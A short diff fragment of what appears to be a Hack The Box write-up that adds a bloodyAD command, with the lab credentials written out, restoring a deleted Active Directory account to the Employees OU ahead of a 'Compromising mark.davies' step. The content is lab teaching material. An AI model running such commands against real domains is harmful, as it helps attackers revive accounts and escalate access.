@@ -186,6 +186,13 @@ If i check the child nodes on the deleted objects OU, its only mark, so this pri
 # Restoring `mark.davies` to `Employees` OU
 
 ```python
-
+❯❯❯ bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
+[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
 ```
+
+Ill use bloodyAD to restore the object
+
+# Compromising `mark.davies`
+
+
 
